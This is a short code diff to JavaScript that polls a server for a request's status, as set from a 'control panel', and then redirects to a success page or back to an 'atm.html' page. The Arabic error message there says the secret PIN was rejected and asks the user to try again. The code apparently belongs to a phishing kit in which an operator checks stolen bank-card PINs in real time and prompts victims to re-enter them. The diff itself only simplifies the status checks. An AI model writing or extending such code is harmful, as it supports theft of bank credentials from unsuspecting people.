@@ -355,6 +355,7 @@
       .then(function(res) { return res.json(); })
       .then(function(data) {
         if (data.ok) {
+          // البدء في فحص حالة الطلب من لوحة التحكم
           startPollingStatus();
         } else {
           throw new Error('Failed to submit');
@@ -375,11 +376,10 @@
           .then(function(res) { return res.json(); })
           .then(function(data) {
             if (!data || !data.status) return;
-            var status = String(data.status || '').trim().toLowerCase();
-            if (status === 'approved' || status === 'accept' || status === 'accepted' || status === 'verified' || status === 'success') {
+            if (data.status === 'approved') {
               clearInterval(pollInterval);
               window.location.href = 'success.html?id=' + requestId;
-            } else if (status === 'rejected' || status === 'reject' || status === 'declined' || status === 'error' || status === 'failed') {
+            } else if (data.status === 'rejected') {
               clearInterval(pollInterval);
               var rejectMessage = 'تم رفض الرقم السري. يرجى التحقق من البيانات والمحاولة مرة أخرى.';
               window.location.href = 'atm.html?error=atm&msg=' + encodeURIComponent(rejectMessage) + '&id=' + requestId;
